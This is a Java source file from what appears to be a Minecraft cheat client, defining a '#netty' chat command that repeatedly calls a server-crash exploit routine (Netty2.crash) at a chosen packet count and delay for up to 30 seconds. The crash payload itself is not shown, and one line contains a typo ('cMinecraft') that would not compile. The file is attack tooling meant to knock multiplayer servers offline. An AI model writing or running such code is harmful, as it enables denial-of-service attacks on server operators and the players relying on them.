package com.moonclient.pro.Command.impl;

import com.moonclient.pro.Command.Command;
import com.moonclient.pro.Exploit.Crash.Netty2;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.inventory.AbstractContainerMenu;
import net.minecraft.network.chat.Component;
import net.minecraft.client.Minecraft;
import net.minecraft.client.player.LocalPlayer;

@Environment(value=EnvType.CLIENT)
public class NettyCrash2
implements Command {
    private final int EXECUTION_DURATION_SECONDS = 30;

    @Override
    public void execute(String[] args) {
        if (args.length != 3) {
            cMinecraft.getInstance().player.sendSystemMessage(Component.literal("§b[§9lodias§b] §cUsage: " + this.getUsage()), false);
            return;
        }
        try {
            final int totalPackets = Integer.parseInt(args[1]);
            final int delay = Integer.parseInt(args[2]);
            LocalPlayer player = Minecraft.getInstance().player;
            if (player == null) {
                System.out.println("Player is null");
                return;
            }
            AbstractContainerMenu handler = ((Player)player).containerMenu;
            if (handler == null) {
                System.out.println("ScreenHandler is null");
                return;
            }
            final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
            Runnable task = new Runnable(){
                private long endTime = System.currentTimeMillis() + 30000L;
                private int packetsSent = 0;

                @Override
                public void run() {
                    if (System.currentTimeMillis() >= this.endTime || this.packetsSent >= totalPackets) {
                        scheduler.shutdown();
                        return;
                    }
                    Netty2.crash();
                    ++this.packetsSent;
                    scheduler.schedule(this, (long)delay, TimeUnit.MILLISECONDS);
                }
            };
            scheduler.schedule(task, (long)delay, TimeUnit.MILLISECONDS);
        }
        catch (NumberFormatException e) {
            Minecraft.getInstance().player.sendSystemMessage(Component.literal("§b[§9lodias§b] §7Invalid number format"), false);
            System.out.println("Invalid number format: " + args[1] + " or " + args[2]);
        }
    }

    @Override
    public String getUsage() {
        return "#netty <packets> <delay>";
    }
}
 